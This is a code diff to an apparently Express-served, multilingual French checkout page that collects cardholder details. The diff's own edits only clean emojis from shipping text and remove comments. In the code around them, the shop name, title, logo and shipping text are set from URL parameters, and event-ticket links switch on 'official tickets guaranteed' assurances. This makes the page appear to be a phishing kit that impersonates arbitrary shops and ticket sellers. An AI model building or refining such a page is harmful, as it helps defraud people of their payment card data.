@@ -93,9 +93,11 @@ app.get("/checkout", (req, res) => {
   const brand = sanitizeShop(req.query.shop) || SHOP_NAME;
   const isEvent = /rock|event|billet|ticket/i.test(req.query.shop || "");
   const shipParam = req.query.ship ? String(req.query.ship).replace(/[<>"`]/g, "").slice(0, 80) : "";
-  const shipping = shipParam || (isEvent
-    ? "E-Ticket · Livraison immédiate"
-    : "Livraison en 2 jours ouvrés · Suivi inclus");
+  
+  // On nettoie la chaîne reçue pour éviter de doubler les émojis
+  let shipping = shipParam || (isEvent ? "E-Ticket · Livraison immédiate" : "Livraison en 2 jours ouvrés · Suivi inclus");
+  shipping = shipping.replace(/[🎟️🚚]/g, "").trim();
+
   const titleParam = req.query.title ? String(req.query.title).replace(/[<>"`]/g, "").slice(0, 80) : "";
   const heading = titleParam || brand;
   const logoRaw = req.query.logo ? String(req.query.logo).trim() : "";
@@ -277,7 +279,6 @@ const CHECKOUT_HTML = `<!DOCTYPE html>
 <link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
 
-<!-- Facebook Pixel Code -->
 <script>
 !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
 fbq('init','1405300981421901');
@@ -292,8 +293,6 @@ try {
 } catch(e){}
 </script>
 <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1405300981421901&ev=PageView&noscript=1"/></noscript>
-<!-- End Facebook Pixel Code -->
-
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 body{font-family:'Inter',system-ui,sans-serif;color:#2d3748;background:#f7fafc;line-height:1.5}
@@ -359,7 +358,6 @@ body{font-family:'Inter',system-ui,sans-serif;color:#2d3748;background:#f7fafc;l
 
 <div class="wrap">
   <div class="col-form">
-    <!-- 1. Coordonnées -->
     <div class="block-card">
       <div class="block-title-row"><div class="step-num">1</div><h2 id="lang-block1">Coordonnées</h2></div>
       <div class="form-group">
@@ -368,7 +366,6 @@ body{font-family:'Inter',system-ui,sans-serif;color:#2d3748;background:#f7fafc;l
       </div>
     </div>
 
-    <!-- 2. Adresse de livraison -->
     <div class="block-card">
       <div class="block-title-row"><div class="step-num">2</div><h2 id="lang-block2">Adresse de livraison</h2></div>
       <div class="row-grid">
@@ -386,7 +383,6 @@ body{font-family:'Inter',system-ui,sans-serif;color:#2d3748;background:#f7fafc;l
       </div>
     </div>
 
-    <!-- 3. Mode de livraison -->
     <div class="block-card">
       <div class="block-title-row"><div class="step-num">3</div><h2 id="lang-block3">Mode de livraison</h2></div>
       <div class="ship-box">
@@ -395,7 +391,6 @@ body{font-family:'Inter',system-ui,sans-serif;color:#2d3748;background:#f7fafc;l
       </div>
     </div>
 
-    <!-- 4. Informations de paiement -->
     <div class="block-card">
       <div class="block-title-row"><div class="step-num">4</div><h2 id="lang-block4">Informations de paiement</h2></div>
       <div class="card-brands-row">
@@ -413,7 +408,6 @@ body{font-family:'Inter',system-ui,sans-serif;color:#2d3748;background:#f7fafc;l
   </div>
 
   <div class="col-sum">
-    <!-- Récapitulatif -->
     <div class="sum-box">
       <div class="sum-title-row"><span class="sum-title" id="lang-recap">Récapitulatif</span><a href="#" class="toggle-items" id="lang-hide">Masquer les articles</a></div>
       <div id="sum-items"></div>
@@ -429,7 +423,6 @@ body{font-family:'Inter',system-ui,sans-serif;color:#2d3748;background:#f7fafc;l
       </div>
     </div>
 
-    <!-- Réassurance Adaptée (Billets / E-tickets) -->
     <div class="trust-box">
       <div class="trust-item"><span class="trust-icon" id="lang-t1-icon">🔒</span><span id="lang-t1">Paiement 100% sécurisé et chiffré</span></div>
       <div class="trust-item"><span class="trust-icon" id="lang-t2-icon">⚡</span><span id="lang-t3">Livraison instantanée par e-mail</span></div>
@@ -462,7 +455,6 @@ document.getElementById('sum-items').innerHTML=html;
 }
 renderItems();
 
-// Dictionnaire corrigé (sans injection d'émojis doublés)
 var translations = {
   fr: { secTop: "Paiement sécurisé", b1: "Coordonnées", email: "Adresse e-mail", b2: "Adresse de livraison", fn: "Prénom", ln: "Nom", addr: "Adresse", zip: "Code postal", city: "Ville", country: "Pays", phone: "Téléphone", b3: "Mode de livraison", free: "Gratuit", b4: "Informations de paiement", holder: "Titulaire de la carte", btn: "Payer maintenant", secBot: "🔒 Paiement chiffré 256-bit · Vos données sont protégées", recap: "Récapitulatif", hide: "Masquer les articles", promo: "Code de réduction", apply: "Appliquer", sub: "Sous-total", total: "Total", tax: "Taxes incluses", t1: "Paiement 100% sécurisé et chiffré", t2: "Billets officiels 100% garantis", t3: "Livraison instantanée par e-mail", t4: "Support client 7j/7", shipDisplay: "E-Ticket · Livraison immédiate" },
   it: { secTop: "Pagamento protetto", b1: "Dati di contatto", email: "Indirizzo e-mail", b2: "Indirizzo di spedizione", fn: "Nome", ln: "Cognome", addr: "Indirizzo", zip: "Codice postale", city: "Città", country: "Paese", phone: "Telefono", b3: "Metodo di spedizione", free: "Gratuito", b4: "Informazioni di pagamento", holder: "Titolare della carta", btn: "Paga ora", secBot: "🔒 Pagamento crittografato a 256 bit · I tuoi dati sono protetti", recap: "Riepilogo", hide: "Nascondi articoli", promo: "Codice sconto", apply: "Applica", sub: "Totale parziale", total: "Totale", tax: "Tasse incluse", t1: "Pagamento protetto e crittografato al 100%", t2: "Biglietti ufficiali garantiti al 100%", t3: "Consegna istantanea via e-mail", t4: "Supporto clienti 7 giorni su 7", shipDisplay: "E-Ticket · Consegna immediata" },
@@ -514,12 +506,9 @@ if (t) {
   document.getElementById('lang-t3').textContent = t.t3;
   document.getElementById('lang-t4').textContent = t.t4;
   
-  // Appliquer la traduction propre de la livraison sans casser les emojis HTML
-  if (qs.get('ship')) {
-    document.getElementById('lang-ship-display').textContent = qs.get('ship');
-  } else {
-    document.getElementById('lang-ship-display').textContent = t.shipDisplay;
-  }
+  // Nettoyage forcé pour n'afficher qu'un seul émoji propre dans la boîte de livraison
+  var cleanShipStr = (qs.get('ship') || t.shipDisplay).replace(/[🎟️🚚]/g, "").trim();
+  document.getElementById('lang-ship-display').textContent = cleanShipStr;
 }
 
 var sess=null,ready=false,cardReady=false;
